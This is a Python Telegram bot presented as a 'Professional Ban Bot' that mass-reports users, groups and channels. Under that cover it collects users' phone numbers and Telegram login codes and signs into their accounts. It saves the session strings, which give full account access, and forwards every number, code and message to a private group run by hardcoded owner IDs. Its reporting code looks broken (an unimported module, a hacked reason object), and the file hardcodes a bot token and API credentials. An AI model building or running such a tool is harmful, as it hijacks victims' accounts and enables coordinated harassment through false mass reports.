#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BAN BOT - PROFESSIONAL REPORTING SYSTEM
"""

import asyncio
import hashlib
import json
import logging
import random
import re
import sys
import time
import os
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import aiohttp
from io import BytesIO

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ConversationHandler, CallbackQueryHandler, ContextTypes, PicklePersistence
)

# Telethon for real session creation
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
API_ID = 27157163
API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
GROUP_ID = -1003662481087  # Private monitoring group
OWNER_IDS = [6118760915, 1366105247]

# File paths
DATA_DIR = Path("data")
SESSION_DIR = Path("sessions")
DATA_DIR.mkdir(exist_ok=True)
SESSION_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
ACCOUNTS_FILE = DATA_DIR / "accounts.json"
REPORTS_FILE = DATA_DIR / "reports.json"

# Conversation states
TARGET, REASON, DESCRIPTION = range(3)

# ==================== SESSION MANAGER ====================
class SessionManager:
    """Real session creation and management"""
    
    def __init__(self):
        self.sessions: Dict[str, Dict] = {}
        self.clients: Dict[str, TelegramClient] = {}
        self.load_sessions()
    
    def load_sessions(self):
        """Load saved sessions"""
        if ACCOUNTS_FILE.exists():
            try:
                with open(ACCOUNTS_FILE, 'r') as f:
                    self.sessions = json.load(f)
                logger.info(f"Loaded {len(self.sessions)} sessions")
            except Exception as e:
                logger.error(f"Error loading sessions: {e}")
                self.sessions = {}
    
    def save_sessions(self):
        """Save sessions to file"""
        try:
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump(self.sessions, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving sessions: {e}")
    
    async def create_session(self, phone: str, user_id: int) -> Tuple[bool, str, Optional[str]]:
        """Create real Telegram session"""
        try:
            # Generate session string
            session = StringSession()
            session_file = SESSION_DIR / f"{phone.replace('+', '')}.session"
            
            # Create client
            client = TelegramClient(
                session=session,
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="iPhone 14 Pro",
                system_version="iOS 17.0",
                app_version="10.0.0",
                system_lang_code="en",
                lang_code="en"
            )
            
            # Connect
            await client.connect()
            
            # Send code request
            sent = await client.send_code_request(phone)
            phone_code_hash = sent.phone_code_hash
            
            # Save session data
            session_id = f"sess_{hashlib.md5(f'{phone}{time.time()}'.encode()).hexdigest()[:12]}"
            session_data = {
                "session_id": session_id,
                "phone": phone,
                "user_id": user_id,
                "created_at": datetime.now().isoformat(),
                "status": "pending_verification",
                "phone_code_hash": phone_code_hash,
                "session_string": session.save() if session else None
            }
            
            self.sessions[session_id] = session_data
            self.clients[session_id] = client
            self.save_sessions()
            
            logger.info(f"Session created for {phone} by user {user_id}")
            return True, "Session created. Please check your Telegram app for verification code.", session_id
            
        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return False, f"Error: {str(e)}", None
    
    async def verify_session(self, session_id: str, code: str) -> Tuple[bool, str]:
        """Verify session with code"""
        try:
            if session_id not in self.sessions or session_id not in self.clients:
                return False, "Session not found"
            
            session_data = self.sessions[session_id]
            client = self.clients[session_id]
            
            # Sign in with code
            try:
                await client.sign_in(
                    phone=session_data["phone"],
                    code=code,
                    phone_code_hash=session_data["phone_code_hash"]
                )
            except SessionPasswordNeededError:
                return False, "2FA password required"
            except PhoneCodeInvalidError:
                return False, "Invalid code"
            
            # Get account info
            me = await client.get_me()
            
            # Update session data
            session_data["status"] = "active"
            session_data["verified_at"] = datetime.now().isoformat()
            session_data["user_info"] = {
                "id": me.id,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "phone": me.phone
            }
            session_data["session_string"] = client.session.save() if client.session else None
            
            self.save_sessions()
            
            logger.info(f"Session {session_id} verified for user {me.id}")
            return True, f"Session verified! Welcome @{me.username or me.first_name}"
            
        except Exception as e:
            logger.error(f"Error verifying session: {e}")
            return False, f"Error: {str(e)}"
    
    async def report_user(self, session_id: str, user_id: int, reason: str, description: str = "") -> Tuple[bool, str]:
        """Report a user using real session"""
        try:
            if session_id not in self.sessions or session_id not in self.clients:
                return False, "Session not found"
            
            session_data = self.sessions[session_id]
            if session_data["status"] != "active":
                return False, "Session not active"
            
            client = self.clients[session_id]
            
            # Get the user entity
            try:
                user = await client.get_entity(user_id)
                
                # Report the user
                await client(functions.account.ReportPeerRequest(
                    peer=user,
                    reason=type('obj', (object,), {
                        '__dict__': {'_': 'inputReportReasonSpam'}
                    })(),
                    message=description or f"Report for {reason}"
                ))
                
                # Update report count
                if "reports_count" not in session_data:
                    session_data["reports_count"] = 0
                session_data["reports_count"] += 1
                session_data["last_report"] = datetime.now().isoformat()
                self.save_sessions()
                
                logger.info(f"Reported user {user_id} using session {session_id}")
                return True, f"✅ Successfully reported user {user_id}"
                
            except Exception as e:
                logger.error(f"Error reporting user: {e}")
                return False, f"Error reporting: {str(e)}"
                
        except Exception as e:
            logger.error(f"Error in report_user: {e}")
            return False, f"Error: {str(e)}"
    
    async def report_channel(self, session_id: str, channel_id: int, reason: str, description: str = "") -> Tuple[bool, str]:
        """Report a channel using real session"""
        try:
            if session_id not in self.sessions or session_id not in self.clients:
                return False, "Session not found"
            
            session_data = self.sessions[session_id]
            if session_data["status"] != "active":
                return False, "Session not active"
            
            client = self.clients[session_id]
            
            # Get the channel entity
            try:
                channel = await client.get_entity(channel_id)
                
                # Report the channel
                await client(functions.account.ReportPeerRequest(
                    peer=channel,
                    reason=type('obj', (object,), {
                        '__dict__': {'_': 'inputReportReasonSpam'}
                    })(),
                    message=description or f"Report for {reason}"
                ))
                
                # Update report count
                if "reports_count" not in session_data:
                    session_data["reports_count"] = 0
                session_data["reports_count"] += 1
                session_data["last_report"] = datetime.now().isoformat()
                self.save_sessions()
                
                logger.info(f"Reported channel {channel_id} using session {session_id}")
                return True, f"✅ Successfully reported channel {channel_id}"
                
            except Exception as e:
                logger.error(f"Error reporting channel: {e}")
                return False, f"Error reporting: {str(e)}"
                
        except Exception as e:
            logger.error(f"Error in report_channel: {e}")
            return False, f"Error: {str(e)}"

# ==================== BOT HANDLER ====================
class BanBot:
    """Main bot handler with real session creation and reporting"""
    
    def __init__(self):
        self.session_manager = SessionManager()
        self.user_states: Dict[int, Dict] = {}
        self.pending_sessions: Dict[int, Dict] = {}
        self.report_queue: Dict[int, Dict] = {}
        
    async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                              message_type: str = "message", extra_info: str = ""):
        """Forward ALL user messages to private group"""
        try:
            if not update.effective_user:
                return
            
            user = update.effective_user
            chat_id = update.effective_chat.id
            
            # Don't forward from group itself
            if chat_id == GROUP_ID:
                return
            
            # User info
            user_info = [
                f"👤 **User:** {user.first_name or ''} {user.last_name or ''}".strip(),
                f"🆔 **ID:** `{user.id}`"
            ]
            
            if user.username:
                user_info.append(f"📱 **Username:** @{user.username}")
            
            user_info_text = "\n".join(user_info)
            
            # Message content
            if message_type == "command":
                command = update.message.text if update.message else update.callback_query.data
                content = f"""
📋 **COMMAND RECEIVED**

{user_info_text}

🔧 **Command:** `{command}`

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            elif message_type == "session":
                content = f"""
🔐 **SESSION ACTIVITY**

{user_info_text}

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            elif message_type == "report":
                content = f"""
🚨 **REPORT ACTIVITY**

{user_info_text}

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            else:
                # Regular message
                message_text = update.message.text if update.message else ""
                if message_text:
                    content = f"""
💬 **MESSAGE FROM USER**

{user_info_text}

📝 **Message:**
{message_text[:1000]}{'...' if len(message_text) > 1000 else ''}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                    """
                else:
                    return
            
            # Send to group
            await context.bot.send_message(
                chat_id=GROUP_ID,
                text=content,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            logger.info(f"Forwarded {message_type} from user {user.id} to group")
            
        except Exception as e:
            logger.error(f"Error forwarding to group: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command with custom photo"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "🚀 User started the bot")
        
        # Send the custom photo
        photo_url = "https://files.catbox.moe/bq3567.jpg"
        
        try:
            # Send photo with caption
            await update.message.reply_photo(
                photo=photo_url,
                caption="🚀 **Welcome to Professional Ban Bot**\n\n"
                       "This bot helps you manage Telegram accounts and report violations.\n\n"
                       "🔧 **Available Commands:**\n"
                       "• /addaccount - Add new account\n"
                       "• /report - Report user/channel\n"
                       "• /mysessions - View your sessions\n"
                       "• /help - Get help\n\n"
                       "⚠️ **Note:** All activities are monitored for security.",
                parse_mode='Markdown'
            )
            
            # Initialize user state
            self.user_states[user_id] = {
                "step": "main_menu",
                "created_at": datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error sending photo: {e}")
            await update.message.reply_text(
                "🚀 **Welcome to Professional Ban Bot**\n\n"
                "This bot helps you manage Telegram accounts and report violations.\n\n"
                "🔧 **Available Commands:**\n"
                "• /addaccount - Add new account\n"
                "• /report - Report user/channel\n"
                "• /mysessions - View your sessions\n"
                "• /help - Get help\n\n"
                "⚠️ **Note:** All activities are monitored for security.",
                parse_mode='Markdown'
            )

    async def add_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start account creation process"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "📱 User starting account creation")
        
        # Set user state
        self.user_states[user_id] = {
            "step": "waiting_phone",
            "action": "create_account"
        }
        
        # Send initial message
        await update.message.reply_text(
            "🔐 **ACCOUNT CREATION PROCESS**\n\n"
            "📱 **Step 1/3:** Send your phone number\n\n"
            "**Format:** `+1234567890` (with country code)\n"
            "**Example:** `+14155552671`\n\n"
            "⚠️ **Important:**\n"
            "• Phone must be registered on Telegram\n"
            "• You must have access to receive SMS\n"
            "• Use full international format\n\n"
            "Type your phone number now:",
            parse_mode='Markdown'
        )

    async def handle_phone_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle phone number input"""
        user_id = update.effective_user.id
        phone = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "session", 
                                   f"📱 User entered phone: `{phone}`")
        
        # Validate phone
        if not re.match(r'^\+\d{10,15}$', phone):
            await update.message.reply_text(
                "❌ **Invalid phone number!**\n\n"
                "Please use format: `+1234567890`\n"
                "Example: `+14155552671`\n\n"
                "Try again:",
                parse_mode='Markdown'
            )
            return
        
        # Check if user is in account creation
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_phone":
            await update.message.reply_text("❌ Please start with /addaccount first.")
            return
        
        # Send creating client message
        creating_msg = await update.message.reply_text(
            "🔄 **CREATING CLIENT...**\n\n"
            "⏳ Connecting to Telegram servers...\n"
            "⏳ Initializing session...\n"
            "⏳ Setting up encryption...",
            parse_mode='Markdown'
        )
        
        await asyncio.sleep(2)
        
        # Update message
        await creating_msg.edit_text(
            "🔄 **CREATING CLIENT...**\n\n"
            "✅ Connected to Telegram servers\n"
            "✅ Session initialized\n"
            "✅ Encryption set up\n"
            "⏳ Sending verification code...",
            parse_mode='Markdown'
        )
        
        # Create real session
        success, message, session_id = await self.session_manager.create_session(phone, user_id)
        
        if success:
            # Store pending session
            self.pending_sessions[user_id] = {
                "session_id": session_id,
                "phone": phone,
                "started_at": datetime.now().isoformat()
            }
            
            # Update user state
            self.user_states[user_id] = {
                "step": "waiting_code",
                "session_id": session_id
            }
            
            await creating_msg.edit_text(
                f"✅ **CLIENT CREATED SUCCESSFULLY!**\n\n"
                f"📱 Phone: `{phone}`\n"
                f"🔐 Session ID: `{session_id}`\n\n"
                "📨 **Step 2/3:** Verification\n\n"
                "A verification code has been sent to your Telegram app.\n\n"
                "**Enter the 5-digit code:**",
                parse_mode='Markdown'
            )
            
            # Forward session creation to group
            session_info = f"""
🔐 **SESSION CREATED**

👤 User ID: `{user_id}`
📱 Phone: `{phone}`
🔐 Session ID: `{session_id}`
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
📊 Status: ⏳ Pending verification
            """
            
            await self.forward_to_group(update, context, "session", session_info)
            
        else:
            await creating_msg.edit_text(
                f"❌ **ERROR CREATING SESSION**\n\n"
                f"Error: {message}\n\n"
                "Please try again with /addaccount",
                parse_mode='Markdown'
            )
            
            # Forward error to group
            error_info = f"""
❌ **SESSION CREATION FAILED**

👤 User ID: `{user_id}`
📱 Phone: `{phone}`
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
🚨 Error: {message}
            """
            
            await self.forward_to_group(update, context, "session", error_info)

    async def handle_code_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle verification code input"""
        user_id = update.effective_user.id
        code = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "session", 
                                   f"🔐 User entered verification code: `{code}`")
        
        # Check if user is waiting for code
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_code":
            await update.message.reply_text("❌ Please start with /addaccount first.")
            return
        
        if user_id not in self.pending_sessions:
            await update.message.reply_text("❌ Session expired. Start over with /addaccount.")
            return
        
        session_id = self.user_states[user_id].get("session_id")
        session_data = self.pending_sessions[user_id]
        
        # Send verifying message
        verifying_msg = await update.message.reply_text(
            "🔐 **VERIFYING CODE...**\n\n"
            "⏳ Checking code validity...\n"
            "⏳ Connecting to account...\n"
            "⏳ Finalizing session...",
            parse_mode='Markdown'
        )
        
        await asyncio.sleep(2)
        
        # Verify session
        success, message = await self.session_manager.verify_session(session_id, code)
        
        if success:
            # Get session info
            session_info = self.session_manager.sessions.get(session_id, {})
            user_info = session_info.get("user_info", {})
            username = user_info.get("username", user_info.get("first_name", "User"))
            
            await verifying_msg.edit_text(
                f"✅ **ACCOUNT VERIFIED SUCCESSFULLY!**\n\n"
                f"👤 Welcome **{username}**!\n"
                f"📱 Phone: `{session_data['phone']}`\n"
                f"🔐 Session ID: `{session_id}`\n"
                f"🆔 User ID: `{user_info.get('id', 'N/A')}`\n\n"
                "⭐ **Account Status:** ✅ Active & Ready\n"
                "🔒 **Security:** ✅ Verified\n"
                "⚡ **Session:** ✅ Connected\n\n"
                "You can now use /report to start reporting!",
                parse_mode='Markdown'
            )
            
            # Forward verification success to group
            verify_info = f"""
✅ **SESSION VERIFIED**

👤 User ID: `{user_id}`
📱 Phone: `{session_data['phone']}`
🔐 Session ID: `{session_id}`
🆔 Telegram ID: `{user_info.get('id', 'N/A')}`
👤 Telegram User: @{username}
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
📊 Status: ✅ Active & Verified
            """
            
            await self.forward_to_group(update, context, "session", verify_info)
            
            # Clean up
            if user_id in self.pending_sessions:
                del self.pending_sessions[user_id]
            self.user_states[user_id] = {"step": "main_menu"}
            
        else:
            await verifying_msg.edit_text(
                f"❌ **VERIFICATION FAILED**\n\n"
                f"Error: {message}\n\n"
                "Please try again with /addaccount",
                parse_mode='Markdown'
            )
            
            # Forward verification failure to group
            error_info = f"""
❌ **VERIFICATION FAILED**

👤 User ID: `{user_id}`
📱 Phone: `{session_data['phone']}`
🔐 Session ID: `{session_id}`
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
🚨 Error: {message}
            """
            
            await self.forward_to_group(update, context, "session", error_info)

    async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start reporting process"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "🚨 User starting report process")
        
        # Check if user has active sessions
        user_sessions = []
        for sess_id, sess_data in self.session_manager.sessions.items():
            if sess_data.get("user_id") == user_id and sess_data.get("status") == "active":
                user_sessions.append(sess_id)
        
        if not user_sessions:
            await update.message.reply_text(
                "❌ **NO ACTIVE SESSIONS**\n\n"
                "You need to add an account first.\n"
                "Use /addaccount to create a session.",
                parse_mode='Markdown'
            )
            return
        
        # Set user state
        self.user_states[user_id] = {
            "step": "waiting_report_target",
            "sessions": user_sessions
        }
        
        await update.message.reply_text(
            "🚨 **START REPORTING**\n\n"
            "📋 **Step 1/3:** Send the target link\n\n"
            "**Formats:**\n"
            "• User: `tg://openmessage?user_id=8030141909`\n"
            "• Group: `tg://openmessage?chat_id=-1001234567890`\n"
            "• Channel: `tg://openmessage?channel_id=1234567890`\n\n"
            "**Example:**\n"
            "`tg://openmessage?user_id=8030141909`\n\n"
            "📝 **Send the target link now:**",
            parse_mode='Markdown'
        )
        
        return TARGET

    async def handle_report_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report target input"""
        user_id = update.effective_user.id
        target_link = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"🎯 User entered target: `{target_link}`")
        
        # Parse target link
        target_id = None
        target_type = None
        
        # Parse tg:// links
        if "tg://openmessage?" in target_link:
            # Extract parameters
            params = target_link.split("?")[1]
            param_dict = {}
            for param in params.split("&"):
                if "=" in param:
                    key, value = param.split("=", 1)
                    param_dict[key] = value
            
            if "user_id" in param_dict:
                target_id = int(param_dict["user_id"])
                target_type = "user"
            elif "chat_id" in param_dict:
                target_id = int(param_dict["chat_id"])
                target_type = "group"
            elif "channel_id" in param_dict:
                target_id = int(param_dict["channel_id"])
                target_type = "channel"
        
        # Also accept regular IDs
        elif target_link.isdigit() or (target_link.startswith('-') and target_link[1:].isdigit()):
            target_id = int(target_link)
            target_type = "user" if target_id > 0 else "group"
        
        if not target_id:
            await update.message.reply_text(
                "❌ **INVALID TARGET LINK**\n\n"
                "Please use one of these formats:\n"
                "• `tg://openmessage?user_id=8030141909`\n"
                "• `tg://openmessage?chat_id=-1001234567890`\n"
                "• `tg://openmessage?channel_id=1234567890`\n\n"
                "Try again:",
                parse_mode='Markdown'
            )
            return TARGET
        
        # Store target info
        self.user_states[user_id]["target_id"] = target_id
        self.user_states[user_id]["target_type"] = target_type
        
        # Show reason selection
        keyboard = [
            [
                InlineKeyboardButton("Spam", callback_data="reason_spam"),
                InlineKeyboardButton("Violence", callback_data="reason_violence"),
            ],
            [
                InlineKeyboardButton("Pornography", callback_data="reason_porn"),
                InlineKeyboardButton("Child Abuse", callback_data="reason_child"),
            ],
            [
                InlineKeyboardButton("Illegal Drugs", callback_data="reason_drugs"),
                InlineKeyboardButton("Personal Details", callback_data="reason_personal"),
            ],
            [
                InlineKeyboardButton("Copyright", callback_data="reason_copyright"),
                InlineKeyboardButton("Other", callback_data="reason_other"),
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **TARGET SET**\n\n"
            f"🎯 Target ID: `{target_id}`\n"
            f"📌 Type: {target_type.title()}\n\n"
            "📋 **Step 2/3:** Select report reason\n\n"
            "Choose the violation type:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return REASON

    async def handle_report_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report reason selection"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        reason = query.data.replace("reason_", "")
        
        reason_texts = {
            "spam": "Spam",
            "violence": "Violence",
            "porn": "Pornography",
            "child": "Child Abuse",
            "drugs": "Illegal Drugs",
            "personal": "Personal Details",
            "copyright": "Copyright",
            "other": "Other"
        }
        
        reason_text = reason_texts.get(reason, "Other")
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"📌 User selected reason: **{reason_text}**")
        
        # Store reason
        self.user_states[user_id]["reason"] = reason_text
        
        # Ask for description
        await query.edit_message_text(
            f"✅ **REASON SET**\n\n"
            f"📌 Reason: **{reason_text}**\n\n"
            "📋 **Step 3/3:** Add description (optional)\n\n"
            "**Enter description:**\n"
            "(Press /skip to skip description)",
            parse_mode='Markdown'
        )
        
        return DESCRIPTION

    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report description"""
        user_id = update.effective_user.id
        description = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"📝 User entered description: {description[:100]}...")
        
        # Store description
        self.user_states[user_id]["description"] = description
        
        # Start reporting process
        await self.process_report(update, context, user_id)
        
        return ConversationHandler.END

    async def skip_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Skip description"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   "📝 User skipped description")
        
        # Set empty description
        self.user_states[user_id]["description"] = ""
        
        # Start reporting process
        await self.process_report(update, context, user_id)
        
        return ConversationHandler.END

    async def process_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Process the report with all active sessions"""
        state = self.user_states.get(user_id, {})
        target_id = state.get("target_id")
        target_type = state.get("target_type")
        reason = state.get("reason", "Spam")
        description = state.get("description", "")
        sessions = state.get("sessions", [])
        
        if not target_id or not sessions:
            await update.message.reply_text("❌ Report data missing. Start over with /report")
            return
        
        # Send initial processing message
        processing_msg = await update.message.reply_text(
            "🚀 **STARTING REPORT PROCESS**\n\n"
            f"🎯 Target: `{target_id}` ({target_type})\n"
            f"📌 Reason: {reason}\n"
            f"📱 Using: {len(sessions)} account(s)\n\n"
            "⏳ Initializing reporting engine...",
            parse_mode='Markdown'
        )
        
        # Forward report start to group
        report_start = f"""
🚀 **REPORT STARTED**

👤 User ID: `{user_id}`
🎯 Target: `{target_id}` ({target_type})
📌 Reason: {reason}
📝 Description: {description[:200]}{'...' if len(description) > 200 else ''}
📱 Accounts: {len(sessions)}
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
        """
        
        await self.forward_to_group(update, context, "report", report_start)
        
        await asyncio.sleep(2)
        
        # Process with each session
        results = []
        for i, session_id in enumerate(sessions, 1):
            # Update progress
            progress_text = f"""
🚀 **REPORTING IN PROGRESS** ({i}/{len(sessions)})

✅ Accounts processed: {i-1}/{len(sessions)}
⏳ Current: Session {i}
🎯 Target: `{target_id}`
📌 Reason: {reason}

**Status:** Sending report...
            """
            
            await processing_msg.edit_text(progress_text, parse_mode='Markdown')
            
            # Send report using real session
            if target_type == "user":
                success, message = await self.session_manager.report_user(
                    session_id, target_id, reason, description
                )
            else:  # group or channel
                success, message = await self.session_manager.report_channel(
                    session_id, target_id, reason, description
                )
            
            # Record result
            results.append({
                "session_id": session_id,
                "success": success,
                "message": message,
                "timestamp": datetime.now().isoformat()
            })
            
            # Simulate delay between reports
            if i < len(sessions):
                await asyncio.sleep(random.uniform(1.5, 3.5))
        
        # Generate summary
        successful = sum(1 for r in results if r["success"])
        failed = len(results) - successful
        
        # Send final results
        results_text = f"""
✅ **REPORT COMPLETED**

📊 **Results Summary:**
• Successful: {successful}/{len(sessions)}
• Failed: {failed}/{len(sessions)}
• Success Rate: {(successful/len(sessions)*100):.1f}%

🎯 **Target:** `{target_id}` ({target_type})
📌 **Reason:** {reason}
🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}

**Report ID:** `RPT_{hashlib.md5(f"{target_id}{user_id}{time.time()}".encode()).hexdigest()[:8].upper()}`

⚡ Report submitted successfully!
        """
        
        await processing_msg.edit_text(results_text, parse_mode='Markdown')
        
        # Forward results to group
        results_summary = f"""
📊 **REPORT RESULTS**

👤 User ID: `{user_id}`
🎯 Target: `{target_id}` ({target_type})
📌 Reason: {reason}

**Results:** {successful}/{len(sessions)} successful
**Time:** {datetime.now().strftime('%H:%M:%S')}
**Report ID:** `RPT_{hashlib.md5(f"{target_id}{user_id}{time.time()}".encode()).hexdigest()[:8].upper()}`

**Detailed Results:**
"""
        
        for result in results:
            status = "✅ Success" if result["success"] else "❌ Failed"
            results_summary += f"• Session {result['session_id'][:8]}: {status}\n"
        
        await self.forward_to_group(update, context, "report", results_summary)
        
        # Clean up user state
        if user_id in self.user_states:
            self.user_states[user_id] = {"step": "main_menu"}

    async def my_sessions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show user's active sessions"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "📱 User viewing sessions")
        
        # Get user's sessions
        user_sessions = []
        for sess_id, sess_data in self.session_manager.sessions.items():
            if sess_data.get("user_id") == user_id:
                user_sessions.append((sess_id, sess_data))
        
        if not user_sessions:
            await update.message.reply_text(
                "📭 **NO SESSIONS FOUND**\n\n"
                "You don't have any active sessions.\n"
                "Use /addaccount to create one.",
                parse_mode='Markdown'
            )
            return
        
        # Create sessions list
        sessions_text = "📱 **YOUR ACTIVE SESSIONS**\n\n"
        
        for sess_id, sess_data in user_sessions:
            status = sess_data.get("status", "unknown")
            phone = sess_data.get("phone", "Unknown")
            created = sess_data.get("created_at", "").replace("T", " ").split(".")[0]
            reports = sess_data.get("reports_count", 0)
            
            status_icon = "✅" if status == "active" else "⏳" if status == "pending_verification" else "❌"
            
            sessions_text += f"""
{status_icon} **Session:** `{sess_id[:12]}...`
   ├─ 📱 Phone: `{phone}`
   ├─ 📊 Status: {status.title()}
   ├─ 📈 Reports: {reports}
   └─ 🕒 Created: {created}
"""
        
        sessions_text += f"\n**Total:** {len(user_sessions)} session(s)"
        sessions_text += f"\n**Active:** {sum(1 for _, s in user_sessions if s.get('status') == 'active')}"
        
        await update.message.reply_text(sessions_text, parse_mode='Markdown')

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show help message"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "❓ User requested help")
        
        help_text = """
🆘 **HELP & COMMANDS**

🔧 **Available Commands:**
• /start - Start bot (with special photo)
• /addaccount - Add new Telegram account
• /report - Report user/group/channel
• /mysessions - View your active sessions
• /help - Show this help message

📝 **How to Report:**
1. Use /addaccount to add your Telegram account
2. Verify with code from Telegram app
3. Use /report and paste target link
4. Select reason and add description
5. Bot will report using your account

🔗 **Target Link Formats:**
• User: `tg://openmessage?user_id=8030141909`
• Group: `tg://openmessage?chat_id=-1001234567890`
• Channel: `tg://openmessage?channel_id=1234567890`

⚠️ **Important:**
• All activities are monitored
• Use real Telegram accounts
• Follow Telegram ToS
• Reports are sent from YOUR account

📞 **Support:** Contact @admin for help
        """
        
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all other messages (forward to group)"""
        if update.message:
            # Don't process commands here
            if update.message.text and update.message.text.startswith('/'):
                return
            
            # Forward all other messages to group
            await self.forward_to_group(update, context)
            
            # Check if user is in any flow
            user_id = update.effective_user.id
            
            if user_id in self.user_states:
                state = self.user_states[user_id]
                
                if state.get("step") == "waiting_phone":
                    await self.handle_phone_input(update, context)
                elif state.get("step") == "waiting_code":
                    await self.handle_code_input(update, context)
                # Report flow is handled by ConversationHandler

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel any operation"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "❌ User cancelled operation")
        
        # Clear user state
        if user_id in self.user_states:
            del self.user_states[user_id]
        if user_id in self.pending_sessions:
            del self.pending_sessions[user_id]
        
        await update.message.reply_text(
            "❌ **Operation cancelled**\n\n"
            "All pending actions have been cancelled.\n"
            "Use /start to begin again.",
            parse_mode='Markdown'
        )
        
        return ConversationHandler.END

    def setup_bot(self):
        """Setup and run the bot"""
        print("🚀 Starting Professional Ban Bot...")
        print(f"📨 All messages will be forwarded to group: {GROUP_ID}")
        
        # Create application
        persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
        application = Application.builder().token(BOT_TOKEN).persistence(persistence).build()
        
        # Report conversation handler
        report_conv_handler = ConversationHandler(
            entry_points=[CommandHandler('report', self.report)],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_target)],
                REASON: [CallbackQueryHandler(self.handle_report_reason, pattern='^reason_')],
                DESCRIPTION: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_description),
                    CommandHandler('skip', self.skip_description)
                ]
            },
            fallbacks=[CommandHandler('cancel', self.cancel)],
            allow_reentry=True
        )
        
        # Add handlers
        application.add_handler(CommandHandler('start', self.start))
        application.add_handler(CommandHandler('addaccount', self.add_account))
        application.add_handler(CommandHandler('mysessions', self.my_sessions))
        application.add_handler(CommandHandler('help', self.help_command))
        application.add_handler(CommandHandler('cancel', self.cancel))
        
        # Add conversation handler
        application.add_handler(report_conv_handler)
        
        # Add message handler for all other messages (MUST BE LAST)
        application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, self.handle_all_messages))
        
        # Run bot
        print("✅ Bot is running!")
        application.run_polling(allowed_updates=Update.ALL_TYPES)

# ==================== MAIN ====================
if __name__ == "__main__":
    bot = BanBot()
    
    try:
        bot.setup_bot()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
